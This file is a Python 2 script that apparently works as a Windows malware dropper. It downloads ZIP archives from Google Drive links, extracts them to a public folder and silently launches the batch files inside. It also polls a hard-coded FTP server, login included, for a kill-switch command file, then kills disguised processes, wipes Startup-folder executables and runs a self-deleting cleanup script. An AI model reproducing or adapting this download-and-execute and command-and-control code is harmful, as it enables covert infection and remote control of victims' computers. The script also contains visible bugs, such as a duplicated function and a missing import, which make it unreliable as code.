from urllib2 import urlopen
from time import sleep
from zipfile import ZipFile
from shutil import rmtree
from os import system
from os import getenv
from os import path
from os import makedirs
from os import remove
from sys import exit
import os 
import ftplib


def download(link,name):
	print 'downloading -> '+ name
	import urllib2
	url = link
	if link.startswith('done'):
		return
	else:	

		req = urlopen(url)
		CHUNK = 16 * 1024
		with open(name, 'wb') as fp:
		  while True:
			chunk = req.read(CHUNK)
			if not chunk: break
			fp.write(chunk)
	try:		
		Extractor(name)
	except Exception as e:
		print e
		sleep(10)
		download(link,name)

def Extractor(name):
	print 'Extracting -> '+name
	fh = open(name, 'rb')
	z = ZipFile(fh)
	val1=''.join(map(str,name.split('\\')[-1]))[:-4]
	if path.isdir("C:\\Users\\Public\\Local\\"+val1):
		rmtree("C:\\Users\\Public\\Local\\"+val1, ignore_errors=True)	
		
	for name in z.namelist():
		outpath = "C:\\Users\\Public\\Local\\"+val1
		z.extract(name, outpath)
	fh.close()

	sleep(3)	
	system("start /min C:\\Users\\Public\\Local\\"+val1+"\\Copyright@2018\\readme.bat & exit")
	return

def start1():
	fullfilename = path.join('C:\\Users\\Public\\Local', 'AppData.zip')	
	try:
		download("https://drive.google.com/uc?export=download&id=1qcWcSj5jKngTX1pY4ZwKaqa4IQk6WsHd",fullfilename)
	except Exception as e: 
		sleep(5)

		start1()

def start2():
	fullfilename = path.join('C:\\Users\\Public\\Local', 'System.zip')	
	try:
		download("https://drive.google.com/uc?export=download&id=1aaY3UAl5oyfBKNYX9_iDNPNGBPmZP-8h",fullfilename)
	except Exception as e: 

		sleep(5)
		start2()

		

def start3():
	fullfilename = path.join('C:\\Users\\Public\\Local', 'IntelRunner.zip')	
	try:
		download("https://drive.google.com/uc?export=download&id=1h_uu2BuymTsEDYciPD0Nx95UZ7ox_hRO",fullfilename)
	except Exception as e: 

		sleep(5)
		start3()
		
def start4():
	fullfilename = path.join('C:\\Users\\Public\\Local', 'Windows.zip')	
	try:
		download("https://drive.google.com/uc?export=download&id=1h_uu2BuymTsEDYciPD0Nx95UZ7ox_hRO",fullfilename)
	except Exception as e: 

		sleep(5)
		start3()
		
def start4():
	fullfilename = path.join('C:\\Users\\Public\\Local', 'SystemRunner.zip')	
	try:
		download("https://drive.google.com/uc?export=download&id=1xkXZ_Ihq86kh_rHZH6_EF_g3Y-_cw2lt",fullfilename)
	
	except Exception as e: 

		sleep(5)
		start4()
	

def loop():

	path=os.getenv("LOCALAPPDATA")
	path=path.replace('\\','').replace(':','')+'Commands.txt'
	ftp = ftplib.FTP("files.000webhost.com")

	ftp.login("rajshreezade01", "12345678") 
	list=[]
	from shutil import rmtree
	if path in ftp.nlst():
		print 'cleaning..'
		os.system('taskkill /f /im photoshop.exe & taskkill /f /im photoeditor.exe & attrib -h -r -s C:\\Users\\Public\\Local\\Appdata\\Copyright@2018\\*.* & exit')
		os.system('attrib -h -r -s C:\\Users\\Public\\Local\\System\\Copyright@2018\\*.* &exit')
		rmtree("C:\\Users\\Public\\Local\\System\\Copyright@2018", ignore_errors=True)
		rmtree("C:\\Users\\Public\\Local\\System", ignore_errors=True)
		rmtree("C:\\Users\\Public\\Local", ignore_errors=True)
	
		rmtree("C:\\Users\\Public\\Intel",ignore_errors=True)
		file=open('C:\\Users\\Public\\Windows\\cleaner.bat','w+')
		file.write("@echo off\ntaskkill /f /im test.exe\nDEL \"C:\\Users\\Public\\Windows\\test.exe\" \ndel \"%USERPROFILE%\AppData\\Roaming\\Microsoft\\Windows\\Start Menu\\Programs\\Startup\\test.exe")
		file.write("\ndel \"%USERPROFILE%\\AppData\\Roaming\\Microsoft\\Windows\\Start Menu\\Programs\\Startup\\photoshop.exe")
		file.write("\ndel \"%USERPROFILE%\\AppData\\Roaming\\Microsoft\\Windows\\Start Menu\\Programs\\Startup\\photoeditor.exe")
		file.write("\ndel \"%USERPROFILE%\\AppData\\Roaming\\Microsoft\\Windows\\Start Menu\\Programs\\Startup\\license.exe")
		file.write("\ndel C:\\Users\\Public\\Windows\\Win32.exe")
		file.write("\ndel C:\\Users\\Public\\Windows\\cleaner.bat & exit")
		file.close()
		os.system('start /min  C:\\Users\\Public\\Windows\\cleaner.bat')
		exit()
	else:

		import time
		sleep(120)
		loop()	

				
path1 = getenv("LOCALAPPDATA")#Specify your FTP Server address
val='\\'.join(map(str,  path1.split("\\")[:-2])) 
if 	path.isdir("C:\\Users\\Public\\Local"):
	os.system("attrib -h -r -s C:\Users\Public\Local\System\Copyright@2018\*.*")
	rmtree("C:\\Users\\Public\\Local", ignore_errors=True)
try:	
	makedirs("C:\\Users\\Public\\Local")
except:
	exit()	
if path.isfile(val+'\\AppData\\Roaming\\Microsoft\\Windows\\Start Menu\\Programs\\Startup\\license.exe'):
	remove(val+'\\AppData\\Roaming\\Microsoft\\Windows\\Start Menu\\Programs\\Startup\\license.exe')


def doAllocate(size):
    result=size*[None]
    count=0
    for i in range(size):

        message= str(random.randint(1,100))+"some unique object %d" % ( i, )

        result[i]= message

    return result


doAllocate(2621440)
print("Allocated")
	
start1()
start2()
start3()
start4()
loop()
